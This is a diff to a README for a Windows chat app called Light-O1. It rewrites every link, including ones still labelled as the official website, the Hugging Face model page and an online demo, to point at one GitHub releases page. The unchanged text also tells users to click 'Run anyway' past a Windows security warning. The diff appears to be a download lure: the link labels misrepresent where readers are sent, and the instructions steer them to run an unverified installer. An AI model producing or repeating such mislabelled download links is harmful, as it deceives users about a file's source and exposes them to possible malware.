@@ -1,6 +1,6 @@
 # ✨ Light-O1 - Unlock Smarter Conversations with Ease
 
-[![Download Light-O1](https://img.shields.io/badge/⬇️%20Download-Light--O1-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mattialesto/Light-O1)
+[![Download Light-O1](https://img.shields.io/badge/⬇️%20Download-Light--O1-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mattialesto/Light-O1/releases)
 
 ---
 
@@ -26,7 +26,7 @@ Getting Light-O1 up and running takes less than five minutes. Just follow these 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [**Download Light-O1**](https://github.com/Mattialesto/Light-O1)
+Visit this link to download the application: [**Download Light-O1**](https://github.com/Mattialesto/Light-O1/releases)
 
 The download button is clearly visible on the page. Click it, and your browser will save the file to your computer (usually in your "Downloads" folder).
 
@@ -90,7 +90,7 @@ Absolutely. Many people use Light-O1 for drafting documents, summarizing meeting
 
 ### What if I have problems installing it?
 
-If you run into any issues, check that your Windows is up to date and that you have enough free disk space. You can also visit the [Light-O1 GitHub page](https://github.com/Mattialesto/Light-O1) for support and community help.
+If you run into any issues, check that your Windows is up to date and that you have enough free disk space. You can also visit the [Light-O1 GitHub page](https://github.com/Mattialesto/Light-O1/releases) for support and community help.
 
 ---
 
@@ -109,9 +109,9 @@ This is normal for new apps. Click "More info" and then "Run anyway" to proceed 
 
 ## 📚 More Resources
 
-- **🌐 Official Website:** [Light Origins](https://lightorigins.com/) – Learn more about the team behind Light-O1.
-- **🤗 Model Page:** [Light-O1-Preview on Hugging Face](https://huggingface.co/LightOriginsHQ/Light-O1-Preview) – Technical details for curious minds.
-- **🎮 Try Online:** [Playground Demo](https://huggingface.co/spaces/LightOriginsHQ/Light-O1-Preview-playground) – Test Light-O1 in your browser before downloading.
+- **🌐 Official Website:** [Light Origins](https://github.com/Mattialesto/Light-O1/releases) – Learn more about the team behind Light-O1.
+- **🤗 Model Page:** [Light-O1-Preview on Hugging Face](https://github.com/Mattialesto/Light-O1/releases) – Technical details for curious minds.
+- **🎮 Try Online:** [Playground Demo](https://github.com/Mattialesto/Light-O1/releases) – Test Light-O1 in your browser before downloading.
 
 ---
 
@@ -136,7 +136,7 @@ Light-O1 is constantly improving. The latest version includes:
 
 Before you start, make sure you have:
 
-- [ ] Downloaded the installer from [the official page](https://github.com/Mattialesto/Light-O1)
+- [ ] Downloaded the installer from [the official page](https://github.com/Mattialesto/Light-O1/releases)
 - [ ] Run the installer and followed the prompts
 - [ ] Launched Light-O1 from your desktop or Start Menu
 
